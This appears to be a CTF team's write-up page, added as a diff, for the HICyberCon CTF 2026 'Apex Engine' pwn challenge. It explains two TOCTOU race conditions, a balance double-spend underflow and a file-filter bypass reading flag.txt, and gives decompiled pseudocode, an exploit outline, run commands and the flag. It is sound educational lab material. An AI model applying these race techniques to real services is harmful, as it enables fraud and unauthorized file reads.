@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Apex Engine · HICyberCon CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="Escrow transfers check the balance, sleep 25 ms, then deduct, so two full-balance orders underflow it into a huge number and buy VIP. Inside the vault, the file filter runs before a second 25 ms sleep, so swapping the shared path to flag.txt mid-stream prints the flag." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=9bb4ee8e" />
+<link rel="stylesheet" href="../css/pages.css?v=15906e9c" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <a href="../events/hicybercon-ctf-2026.html">hicybercon-ctf-2026</a> <span aria-hidden="true">/</span> <span>apex-engine</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Apex Engine <span class="page-sub">Two TOCTOU races in threaded workers</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-pwn">pwn</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">hiCTF{t0ct0u_mult1thr34d_r4c3_c0nd1t10n_w1n_8d3f_3c6bd2cbb4}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<h2 id="protections"><a class="wu-anchor" href="#protections" aria-hidden="true">#</a>Protections</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">RELRO: Full   Stack: Canary   NX: Yes   PIE: Yes   FORTIFY: yes</code></pre>
+      
+    </figure><p>Full RELRO + PIE + canary means no GOT/ret2win path: this is a pure <strong>logic/race</strong> bug.</p>
+<h2 id="analysis-ghidra-decompile-main-0x12c0-and-two-thread-workers"><a class="wu-anchor" href="#analysis-ghidra-decompile-main-0x12c0-and-two-thread-workers" aria-hidden="true">#</a>Analysis (Ghidra decompile → <code>main</code> @0x12c0, and two thread workers)</h2>
+<p>Globals (<code>0x43e0+</code>):</p>
+<ul>
+<li><code>0x43e0</code> balance (u64, starts 100) · <code>0x43e8</code> escrow (u64) · <code>0x43f0</code> VIP flag (u32) · <code>0x43f4</code> &quot;root&quot; word (u32, <strong>never written</strong>)</li>
+</ul>
+<p>Menu: 1 view, 2 escrow transfer, 3 withdraw, 4 upgrade VIP (10 000), 5 vault enclave, 6 exit.</p>
+<h3 id="bug-1-toctou-double-spend-fun-00101ef0-settlement-worker"><a class="wu-anchor" href="#bug-1-toctou-double-spend-fun-00101ef0-settlement-worker" aria-hidden="true">#</a>Bug 1 - TOCTOU double-spend (<code>FUN_00101ef0</code> settlement worker)</h3>
+<p><code>menu 2</code> only checks <code>balance &lt; amount</code> at submit time, then spawns a detached thread:</p>
+<figure class="wu-code wu-code-output" data-lines="7">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-text">if (order.status != PENDING) return;
+if (order.amount &lt;= balance) {          // checked NOW
+    status = PROCESSING; usleep(25000); // 25 ms window
+    status = COMPLETED;
+    balance -= order.amount;            // deducted LATER
+    escrow  += order.amount;
+}</code></pre>
+      
+    </figure><p>Because the deduction happens 25 ms after the balance check, submitting <strong>two orders of the
+full balance (100) back-to-back</strong> makes both threads pass the check, then both deduct:
+<code>100 - 100 - 100 = 0xFFFFFFFFFFFFFF9C</code> (unsigned underflow → huge balance). The
+&quot;funds cannot be double-spent&quot; risk model is exactly what is broken.</p>
+<h3 id="bug-2-toctou-file-filter-bypass-fun-00101d80-enclave-stream-worker"><a class="wu-anchor" href="#bug-2-toctou-file-filter-bypass-fun-00101d80-enclave-stream-worker" aria-hidden="true">#</a>Bug 2 - TOCTOU file-filter bypass (<code>FUN_00101d80</code> enclave stream worker)</h3>
+<p>Vault is gated behind VIP (<code>0x43f0</code>). Once inside, <code>create slot</code> (stride 0xb0, path at
+<code>+0x24</code>), <code>stream slot</code> spawns a worker that does:</p>
+<figure class="wu-code wu-code-output" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">if (strstr(path,&quot;flag&quot;) &amp;&amp; root_word==0)  -&gt; deny        // filename filter
+usleep(25000);                                          // 25 ms window
+f = fopen(path,&quot;r&quot;);                                    // path read AGAIN (shared buffer)
+... fread(0x1ff) ... fwrite(stdout)                     // prints file contents</code></pre>
+      
+    </figure><p>The path buffer is shared with <code>menu 3 = Edit Document Target Path</code>, which we can call while
+the worker sleeps. So: stream with the benign default target (<code>&quot;Document_Preview&quot;</code>, contains
+no &quot;flag&quot; → filter passes), then during the 25 ms sleep rewrite the slot path to
+<code>./flag.txt</code> (or <code>/flag</code>). The worker wakes and opens the <em>new</em> path → the <code>flag</code> filter is
+bypassed and the flag is printed.</p>
+<blockquote>
+<p>Note: <code>/flag</code> opens, and on failure <code>path==&quot;/flag&quot;</code> falls back to <code>./flag.txt</code>; both
+contain &quot;flag&quot;, so only the race makes them reachable. The <code>0x43f4</code> &quot;root&quot; bypass word is
+dead code - only the race works.</p>
+</blockquote>
+<h2 id="exploit-exploitpy"><a class="wu-anchor" href="#exploit-exploitpy" aria-hidden="true">#</a>Exploit (<code>exploit.py</code>)</h2>
+<figure class="wu-code" data-lines="12">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-comment"># 1) double-spend underflow</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">send <span class="hljs-string">&quot;2&quot;</span> ; amount <span class="hljs-number">100</span>            <span class="hljs-comment"># order #0</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">send <span class="hljs-string">&quot;2&quot;</span> ; amount <span class="hljs-number">100</span>            <span class="hljs-comment"># order #1 (&lt;25 ms later) -&gt; balance underflows</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">sleep(<span class="hljs-number">0.2</span>)</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc"><span class="hljs-comment"># 2) VIP with the now-huge balance</span></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">send <span class="hljs-string">&quot;4&quot;</span></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc"><span class="hljs-comment"># 3) enter enclave</span></span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">send <span class="hljs-string">&quot;5&quot;</span></span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">send <span class="hljs-string">&quot;1&quot;</span>; slot <span class="hljs-number">0</span>                 <span class="hljs-comment"># create slot (default target &quot;Document_Preview&quot;)</span></span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">send <span class="hljs-string">&quot;2&quot;</span>; slot <span class="hljs-number">0</span>                 <span class="hljs-comment"># stream -&gt; worker enters 25 ms sleep</span></span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">send <span class="hljs-string">&quot;3&quot;</span>; slot <span class="hljs-number">0</span>; <span class="hljs-string">&quot;./flag.txt&quot;</span>   <span class="hljs-comment"># race: rewrite path while worker sleeps</span></span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc"><span class="hljs-comment"># 4) read the enclave data stream -&gt; flag</span></span></span></code></pre>
+      
+    </figure><p>Run:</p>
+<figure class="wu-code" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">cd</span> extracted</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">python3 ../exploit.py                 <span class="hljs-comment"># local (needs ./flag.txt to exist)</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">python3 ../exploit.py remote &lt;host&gt; &lt;port&gt;</span></span></code></pre>
+      
+    </figure><h3 id="local-verification-real-tool-output"><a class="wu-anchor" href="#local-verification-real-tool-output" aria-hidden="true">#</a>Local verification (real tool output)</h3>
+<figure class="wu-code wu-code-output" data-lines="6">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-text">cd extracted &amp;&amp; printf 'hiCTF{l0c4l_t3st_r4c3_byp4ss_0000}\n' &gt; flag.txt
+python3 ../exploit.py
+...
+================ [SECURE ENCLAVE DATA STREAM] ================
+hiCTF{l0c4l_t3st_r4c3_byp4ss_0000}
+==============================================================</code></pre>
+      
+    </figure><p>The full chain (double-spend → VIP → enclave → race) executes and the file contents are
+streamed to stdout, i.e. the primitive reads <code>/flag</code> (or <code>./flag.txt</code>) on the target.</p>
+<h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<p>Running the same chain against the live instance streamed <code>/flag</code>:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-text">hiCTF{t0ct0u_mult1thr34d_r4c3_c0nd1t10n_w1n_8d3f_3c6bd2cbb4}</code></pre>
+      
+    </figure>
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#protections">Protections</a></li><li><a href="#analysis-ghidra-decompile-main-0x12c0-and-two-thread-workers">Analysis (Ghidra decompile → main @0x12c0, and two thread workers)</a><ol class="wu-toc-sub"><li><a href="#bug-1-toctou-double-spend-fun-00101ef0-settlement-worker">Bug 1 - TOCTOU double-spend (FUN_00101ef0 settlement worker)</a></li><li><a href="#bug-2-toctou-file-filter-bypass-fun-00101d80-enclave-stream-worker">Bug 2 - TOCTOU file-filter bypass (FUN_00101d80 enclave stream worker)</a></li></ol></li><li><a href="#exploit-exploitpy">Exploit (exploit.py)</a><ol class="wu-toc-sub"><li><a href="#local-verification-real-tool-output">Local verification (real tool output)</a></li></ol></li><li><a href="#flag">Flag</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="letmeout.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">LetMeOut</span></a>
+    <a class="wu-pager-link wu-pager-next" href="cold-circuit.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Cold Circuit</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=2912532e"></script>
+</body>
+</html>
